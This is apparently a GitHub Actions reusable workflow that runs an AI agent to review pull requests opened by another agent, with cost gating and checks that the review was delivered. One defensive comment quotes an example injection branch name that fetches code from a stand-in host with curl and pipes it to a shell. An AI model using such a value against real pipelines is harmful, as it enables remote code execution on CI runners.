name: Agent review

# Reusable workflow. Verifier rung 2 (architecture §9): an independent agent
# reviews the pull request another agent opened.
#
#   jobs:
#     agent-review:
#       uses: cpheinrich/morpheus/.github/workflows/agent-review.yml@main
#       secrets:
#         claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
#         anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
#
# It does NOT block the merge. A model-graded gate that can fail on its own
# noise trains everyone to bypass it, and rung 4 is still a human.
#
# With no key it says the rung is unconfigured and stops. It must not appear to
# have run — a verifier reporting green because it never executed is worse than
# no verifier, since a green check is read as evidence.

on:
  workflow_call:
    inputs:
      product-dir:
        type: string
        default: "hq/product"
      model:
        description: >
          Pinned deliberately. Left unset the action picks its own default,
          which moved cost and quality with no diff to show for it.
        type: string
        default: "claude-opus-5"
      pr-number:
        description: >
          The pull request to review, for a caller triggered by something that
          is not a `pull_request` event. An `issue_comment` carries an issue
          number and nothing else — no head sha, no branch, no base — so every
          other fact is resolved from this one. Zero means read the event.
        type: number
        default: 0
      morpheus-ref:
        type: string
        default: "main"
      node-version:
        type: string
        default: "22"
      pnpm-version:
        description: >
          Leave empty to let Morpheus's own `packageManager` field decide.
          Setting both makes pnpm/action-setup fail with "Multiple versions of
          pnpm specified".
        type: string
        default: ""
    secrets:
      claude_code_oauth_token:
        description: >
          A Claude subscription token from `claude setup-token`. Preferred over
          the API key when both are present: reviews then bill the subscription,
          whose limit throttles, instead of a prepaid balance, whose floor is an
          outage — an empty balance turned this rung off for six days while
          every check stayed green.
        required: false
      anthropic_api_key:
        description: >
          Prepaid API credits — the fallback when no subscription token is set.
          With neither secret the rung is unconfigured and reports itself as
          skipped.
        required: false

jobs:
  review:
    runs-on: ubuntu-latest
    if: github.event_name == 'pull_request' || inputs.pr-number > 0
    outputs:
      configured: ${{ steps.configuration.outputs.configured }}
      review_requested: ${{ steps.needed.outputs.review }}
      comment_id_before: ${{ steps.since.outputs.comment_id_before }}
      action_conclusion: ${{ steps.review.outputs.conclusion }}
      pr_number: ${{ steps.pr.outputs.number }}
    permissions:
      contents: read
      pull-requests: write
    env:
      # The `secrets` context is not available in a step-level `if`, so the
      # presence of a credential is resolved once here into a plain string.
      # Testing `secrets.*` directly in a conditional silently evaluates to
      # false and the rung would skip even when configured. Either credential
      # configures the rung; which one is *used* is decided at the Review step.
      HAS_KEY: ${{ secrets.anthropic_api_key != '' || secrets.claude_code_oauth_token != '' }}
    steps:
      - name: Record reviewer configuration
        id: configuration
        run: echo "configured=$HAS_KEY" >> "$GITHUB_OUTPUT"

      # Rung 2 is reachable two ways now, and only one of them carries a pull
      # request. Everything the rest of this workflow used to read straight off
      # `github.event.pull_request.*` is resolved here once, from whichever
      # source actually holds it.
      #
      # Failing to resolve is fatal on purpose. The alternative is reviewing
      # some other commit and posting a confident clean review of code that is
      # not in the pull request — the worst output this rung can produce, and
      # indistinguishable from a good one at a glance.
      - name: Resolve the pull request
        id: pr
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          INPUT_NUMBER: ${{ inputs.pr-number }}
          # Through `env:`, never interpolated into the script — see the note on
          # the cursor step below for why a branch name in a `run:` is a shell.
          EVENT_NUMBER: ${{ github.event.pull_request.number }}
          EVENT_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          EVENT_HEAD_REF: ${{ github.head_ref }}
          EVENT_BASE_REF: ${{ github.base_ref }}
        run: |
          set -euo pipefail

          if [ -n "$EVENT_NUMBER" ]; then
            # The payload cannot fail and cannot be stale. Do not ask GitHub for
            # what it has already sent.
            {
              echo "number=$EVENT_NUMBER"
              echo "head_sha=$EVENT_HEAD_SHA"
              echo "head_ref=$EVENT_HEAD_REF"
              echo "base_ref=$EVENT_BASE_REF"
              echo "open=true"
              echo "requested=false"
              # Empty leaves `actions/checkout` on its default behaviour, which
              # is what every `pull_request` run has always done.
              echo "checkout_ref="
            } >> "$GITHUB_OUTPUT"
            exit 0
          fi

          gh api "repos/$REPO/pulls/$INPUT_NUMBER" > /tmp/pr.json
          {
            echo "number=$INPUT_NUMBER"
            echo "head_sha=$(jq -r '.head.sha' /tmp/pr.json)"
            echo "head_ref=$(jq -r '.head.ref' /tmp/pr.json)"
            echo "base_ref=$(jq -r '.base.ref' /tmp/pr.json)"
            echo "open=$(jq -r '.state == "open"' /tmp/pr.json)"
            echo "requested=true"
            # Not the bare sha: a fork's head commit is reachable from no branch
            # of this repository, and `refs/pull/<n>/head` is.
            echo "checkout_ref=refs/pull/$INPUT_NUMBER/head"
          } >> "$GITHUB_OUTPUT"

      # The reviewer compares the change against its base, so it needs history.
      #
      # `ref` is empty on a `pull_request` event, leaving checkout exactly as it
      # has always behaved there. On a comment-triggered run it must be set: an
      # `issue_comment` workflow runs the copy of itself on the default branch
      # with `github.ref` pointing at trunk, so checked out naively the reviewer
      # reads `main`, finds nothing wrong, and reports a clean review of code
      # the pull request does not contain.
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          ref: ${{ steps.pr.outputs.checkout_ref }}

      - uses: actions/checkout@v4
        with:
          repository: cpheinrich/morpheus
          ref: ${{ inputs.morpheus-ref }}
          path: .morpheus

      - uses: pnpm/action-setup@v4
        with:
          version: ${{ inputs.pnpm-version }}
          package_json_file: .morpheus/package.json

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}

      - name: Install the Morpheus CLI runtime
        working-directory: .morpheus
        run: pnpm install --frozen-lockfile

      # What has changed since anyone last *looked*, not since the merge base.
      #
      # The cursor comes from the calling workflow's run history — no new state
      # is stored and nothing can disagree with reality. A reusable workflow has
      # no runs of its own, so the *caller* has to be named, and the name is
      # derived from `GITHUB_WORKFLOW_REF` rather than hardcoded. Hardcoding
      # `ci.yml` worked here and would have made this a permanent no-op in any
      # consumer whose caller is named anything else — the 404 is swallowed, the
      # fallback fires on every push, and the only trace is a log line that
      # reads exactly like a normal first review.
      #
      # Honest about what the cursor measures: the *run's* conclusion, which is
      # CI health rather than review activity. A green run may be one where this
      # gate skipped; a red one may be a failing test on a commit the reviewer
      # did read. Both directions err toward reviewing again, which is the safe
      # way round, so this stays until it demonstrably costs something.
      - name: What has changed since the last review?
        id: since
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # **Never interpolate these into the script.** A branch name is
          # attacker-controlled on a fork pull request, and `${{ }}` substitutes
          # before bash parses — so a branch called `x";curl evil|sh;"` executes.
          # This repo is public and takes external contributions, so it is a
          # live surface rather than a theoretical one. Through `env:` the value
          # reaches bash as data and quoting holds.
          HEAD_REF: ${{ steps.pr.outputs.head_ref }}
          BASE_REF: ${{ steps.pr.outputs.base_ref }}
          HEAD_SHA: ${{ steps.pr.outputs.head_sha }}
          PR_NUMBER: ${{ steps.pr.outputs.number }}
          EVENT_ACTION: ${{ github.event.action }}
          REPO: ${{ github.repository }}
        run: |
          # A comment-triggered checkout fetches `refs/pull/<n>/head` and
          # nothing else, so the base branch has to be brought in by hand before
          # anything can diff against it. A no-op on the `pull_request` path,
          # where a full-depth checkout already has it.
          git fetch --no-tags --quiet origin \
            "+refs/heads/$BASE_REF:refs/remotes/origin/$BASE_REF" || true

          # The cursor reads the caller's *successful runs* as a stand-in for
          # "someone reviewed this commit". That proxy holds only while the
          # caller reviews every push. Morpheus's no longer does — it reviews on
          # `opened` and on request — so consulted there it would find a green
          # run that reviewed nothing, diff against it, and skip. Wrong
          # direction: this rung may re-read a commit, never silently decline.
          #
          # `synchronize` is the case it was built for and is still live in any
          # consumer whose caller runs on every push, so the mechanism stays and
          # only its scope narrows.
          caller=$(basename "${GITHUB_WORKFLOW_REF%%@*}")
          echo "Caller workflow: $caller"
          prev=""

          if [ "$EVENT_ACTION" = "synchronize" ]; then
            if gh api --method GET "repos/$REPO/actions/workflows/$caller/runs" \
              -f branch="$HEAD_REF" -f status=success -F per_page=20 \
              > /tmp/review-runs.json 2>/dev/null; then
              prev=$(jq -r --arg sha "$HEAD_SHA" \
                '[.workflow_runs[] | select(.head_sha != $sha)] | .[0].head_sha // ""' \
                /tmp/review-runs.json)
            else
              echo "::warning title=Review cursor unavailable::could not read earlier workflow runs — comparing against the base branch"
            fi
          else
            echo "Cursor not consulted: this run is not a push onto an already-reviewed branch."
          fi

          if [ -n "$prev" ] && git cat-file -e "$prev^{commit}" 2>/dev/null; then
            echo "base=$prev" >> "$GITHUB_OUTPUT"
            echo "Comparing against the last reviewed commit: $prev"
          else
            echo "base=origin/$BASE_REF" >> "$GITHUB_OUTPUT"
            echo "No previous review found — comparing against the base branch."
          fi

          # The last review's *findings*, not the whole tracking comment.
          #
          # The comment opens with a todo checklist — `- [x] Read src/x.ts` —
          # and often closes with a passing mention like "nothing contradicts
          # .agent/decisions.md". Both name files without raising anything, and
          # the gate cannot tell them from a finding, so a records-only push
          # would be re-reviewed at ~$1.14 on the strength of a closing
          # sentence. That is precisely the spend the gate exists to remove.
          #
          # Checklist lines are dropped because their shape is unambiguous.
          # Passing mentions in prose are a known remaining looseness: the input
          # is the wrong shape for a regex to separate, and tuning the matcher
          # will not fix it. Recorded so the matcher is not blamed for it.
          run_marker="/actions/runs/$GITHUB_RUN_ID)"
          if ! gh api "repos/$REPO/issues/$PR_NUMBER/comments?per_page=100" \
            --paginate --slurp > /tmp/comments-before.json 2>/dev/null; then
            comment_id_before="__unreadable__"
            : > /tmp/prior-review.md
          else
            # A rerun keeps its run id. Snapshot the current run's own tracking
            # comment so an earlier attempt cannot certify this one. `__none__`
            # is distinct from a missing or unreadable output at the verifier.
            comment_id_before=$(jq -r --arg marker "$run_marker" '
              [.[][]
                | select(.user.login == "github-actions[bot]")
                | select((.body // "") | contains("[View job"))
                | select((.body // "") | contains($marker))
                | select((.body // "") | startswith("**Claude finished @") or startswith("**Claude encountered an error"))]
              | .[-1].id // "__none__"
            ' /tmp/comments-before.json)

            jq -r '
              [.[][]
                | select(.user.login == "github-actions[bot]")
                | select((.body // "") | contains("[View job"))
                | select((.body // "") | contains("/actions/runs/"))]
              | .[-1].body // ""
            ' /tmp/comments-before.json \
              | grep -v -E '^\s*-\s*\[[ x]\]' > /tmp/prior-review.md \
              || : > /tmp/prior-review.md
          fi
          echo "comment_id_before=$comment_id_before" >> "$GITHUB_OUTPUT"

      - name: Is this worth a review?
        id: needed
        env:
          BASE: ${{ steps.since.outputs.base }}
          REQUESTED: ${{ steps.pr.outputs.requested }}
          PR_OPEN: ${{ steps.pr.outputs.open }}
        run: |
          # A closed pull request cannot act on a review, so reviewing one
          # spends a dollar posting into a thread nobody will open again.
          if [ "$PR_OPEN" != "true" ]; then
            echo "review=false" >> "$GITHUB_OUTPUT"
            echo "why=the pull request is not open" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # Somebody asked for this one by name. The gate below exists to stop a
          # *trigger* spending money re-reading prose nobody wanted re-read; an
          # explicit request is the judgment that gate is a proxy for, so it
          # wins outright rather than being second-guessed by a heuristic.
          if [ "$REQUESTED" = "true" ]; then
            echo "review=true" >> "$GITHUB_OUTPUT"
            echo "why=a review was requested on the pull request" >> "$GITHUB_OUTPUT"
            exit 0
          fi

          # Not `review=$(node …)`. Command substitution swallows a non-zero
          # exit into an empty string, which reads as "false" and skips — losing
          # the fail-open that `needed()` deliberately provides for an
          # unreadable diff. A crash here must review, not go quiet.
          if ! out=$(node .morpheus/dist/cli/index.js review needed \
            --base "$BASE" --prior-review /tmp/prior-review.md --json); then
            echo "review=true" >> "$GITHUB_OUTPUT"
            echo "why=the review gate failed, so the workflow failed open" >> "$GITHUB_OUTPUT"
            echo "::warning title=Review gate failed::could not decide — reviewing rather than skipping"
            exit 0
          fi
          echo "review=$(jq -r '.review' <<< "$out")" >> "$GITHUB_OUTPUT"
          echo "why=$(jq -r '.why' <<< "$out")" >> "$GITHUB_OUTPUT"

      - name: Report the review as skipped
        if: steps.needed.outputs.review != 'true'
        env:
          SKIP_WHY: ${{ steps.needed.outputs.why }}
        run: |
          {
            echo "## Agent review — nothing to review"
            echo
            echo "Rung 2 did not run: $SKIP_WHY."
            echo "Green here means skipped, not passed."
          } >> "$GITHUB_STEP_SUMMARY"

      # Assembled by the CLI rather than written inline: the prompt is where the
      # judgment in this rung lives, and YAML is the one part of the kit with
      # neither a type checker nor tests behind it.
      - name: Assemble the reviewer prompt
        id: prompt
        if: steps.needed.outputs.review == 'true'
        env:
          # `review prompt` derives the roadmap id from the branch, and reads
          # `GITHUB_HEAD_REF` — which only a `pull_request` event sets. Without
          # this a comment-triggered review gets the persona and no intent,
          # which is the generic "look for bugs" review rung 2 exists not to be.
          MORPHEUS_BRANCH: ${{ steps.pr.outputs.head_ref }}
        run: |
          {
            echo 'text<<PROMPT_EOF'
            node .morpheus/dist/cli/index.js review prompt --dir ${{ inputs.product-dir }}
            echo 'PROMPT_EOF'
          } >> "$GITHUB_OUTPUT"

      # Say so loudly. Skipping in silence would leave a green check that reads
      # as "an agent reviewed this".
      - name: Report the rung as unconfigured
        if: env.HAS_KEY != 'true'
        run: |
          {
            echo "## Agent review — not configured"
            echo
            echo "Verifier rung 2 did **not** run. No \`anthropic_api_key\` reached this"
            echo "workflow, so no independent review of this pull request happened."
            echo
            echo "This check being green means the rung was skipped, not that the change"
            echo "passed it."
            echo
            echo "To enable: add \`CLAUDE_CODE_OAUTH_TOKEN\` (from \`claude setup-token\`,"
            echo "billing a Claude subscription) or \`ANTHROPIC_API_KEY\` (prepaid API"
            echo "credits) to the repository secrets and pass it through."
          } >> "$GITHUB_STEP_SUMMARY"
          echo "::warning title=Agent review skipped::rung 2 is unconfigured — no reviewer ran"

      # The cursor above is only a cost gate. The action deliberately receives
      # no incremental base: every review reads the full PR, so a commit missed
      # by the cursor is still visible on the next run. Keep that invariant —
      # `steps.since.outputs.base` must never scope this step.
      - name: Review
        id: review
        if: env.HAS_KEY == 'true' && steps.needed.outputs.review == 'true'
        # Pinned because delivery parsing depends on this action's final comment
        # contract. A moving v1 tag could otherwise make the detector fail open
        # with no diff in this repository.
        uses: anthropics/claude-code-action@6b082c41935b4c8a3b8b0ef85ba4ba4d9eeb8975 # v1.0.189
        with:
          prompt: ${{ steps.prompt.outputs.text }}
          # The subscription token wins when both credentials exist, and the
          # API key is *withheld* rather than passed alongside it. The action
          # exports whatever it receives, and Claude Code prefers an
          # `ANTHROPIC_API_KEY` in its environment — handed both, it would
          # silently keep billing the prepaid credits this input exists to
          # stop billing, with a green check and no diff to show for it.
          claude_code_oauth_token: ${{ secrets.claude_code_oauth_token }}
          anthropic_api_key: ${{ secrets.claude_code_oauth_token == '' && secrets.anthropic_api_key || '' }}
          github_token: ${{ secrets.GITHUB_TOKEN }}

          # Supplying `prompt` puts the action in automation mode, which in v1
          # deliberately creates no tracking comment. Without this the reviewer
          # runs, thinks, and has nowhere to put the result.
          track_progress: true

          # **The reviewer cannot report without these.** Automation mode grants
          # the base GitHub tools but not the ones that write to a pull request,
          # so the first live run spent 20 turns and $0.86 producing a review it
          # was then denied every means of posting — nine permission denials and
          # a green check. A verifier that cannot speak is indistinguishable
          # from one that found nothing.
          #
          # `--max-turns` is a runaway backstop, not a budget: 20 turns was the
          # observed cost of a records-only PR, and a cap near that would
          # truncate a real review just before it posts.
          # Opus, and pinned. Sonnet was tried for one review and came in at
          # $0.88 against an Opus average of $1.14 — 23%, not the 80% the
          # estimate claimed, because it used *more* turns to get there. At that
          # margin the quality question decides it, and Opus is what found the
          # subtle guard bugs. The gate above is what actually moves the bill.
          #
          # Pinned either way: an unpinned default moves under you, changing cost
          # and quality with no diff to show for it.
          claude_args: |
            --model ${{ inputs.model }}
            --max-turns 40
            --allowedTools "mcp__github_inline_comment__create_inline_comment,Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*)"


  # A normal step after a composite action runs *before* that action's post
  # step. Delivery is a separate job so the comment has already received its
  # final success/error header when it is inspected.
  delivery:
    needs: review
    if: (github.event_name == 'pull_request' || inputs.pr-number > 0) && always() && needs.review.outputs.configured != 'false' && needs.review.outputs.review_requested != 'false'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
        with:
          repository: cpheinrich/morpheus
          ref: ${{ inputs.morpheus-ref }}
          path: .morpheus

      - uses: pnpm/action-setup@v4
        with:
          version: ${{ inputs.pnpm-version }}
          package_json_file: .morpheus/package.json

      - uses: actions/setup-node@v4
        with:
          node-version: ${{ inputs.node-version }}

      - name: Install the Morpheus CLI runtime
        working-directory: .morpheus
        run: pnpm install --frozen-lockfile

      # The action creates a tracking comment before the model reads anything,
      # and can update it with an in-progress checklist before it reports. The
      # exact run URL identifies this action's comment; the final body then has
      # to carry both the action's finished marker and substantive review text.
      - name: Verify the review was delivered
        id: delivery
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          # Resolved by the review job, because an `issue_comment` run has no
          # `github.event.pull_request` to read it from.
          PR_NUMBER: ${{ needs.review.outputs.pr_number }}
          COMMENT_ID_BEFORE: ${{ needs.review.outputs.comment_id_before }}
          ACTION_CONCLUSION: ${{ needs.review.outputs.action_conclusion }}
        run: |
          reason=""
          run_marker="/actions/runs/$GITHUB_RUN_ID)"
          if ! gh api "repos/$REPO/issues/$PR_NUMBER/comments?per_page=100" \
            --paginate --slurp > /tmp/final-review-comments.json; then
            reason="could not read the final tracking comment"
          else
            jq --arg marker "$run_marker" '
              [.[][]
                | select(.user.login == "github-actions[bot]")
                | select((.body // "") | contains("[View job"))
                | select((.body // "") | contains($marker))]
              | .[-1] // {}
            ' /tmp/final-review-comments.json > /tmp/final-review-comment.json
            comment_id=$(jq -r '.id // ""' /tmp/final-review-comment.json)
            jq -r '.body // ""' /tmp/final-review-comment.json > /tmp/final-review-comment.md

            if reason=$(node .morpheus/dist/cli/index.js review delivery \
              --before-comment-id "$COMMENT_ID_BEFORE" \
              --comment-id "$comment_id" \
              --body-file /tmp/final-review-comment.md); then
              {
                echo "## Agent review — delivery confirmed"
                echo
                echo "$reason."
              } >> "$GITHUB_STEP_SUMMARY"
              exit 0
            fi
          fi

          {
            echo "## Agent review — delivery not confirmed"
            echo
            echo "Verifier rung 2 did **not** leave a completed review on this pull request."
            echo "Reason: $reason."
            echo "Action conclusion: ${ACTION_CONCLUSION:-unavailable}."
            echo
            echo "This warning is infrastructure evidence, not a clean review."
          } >> "$GITHUB_STEP_SUMMARY"
          echo "::warning title=Agent review not delivered::$reason"
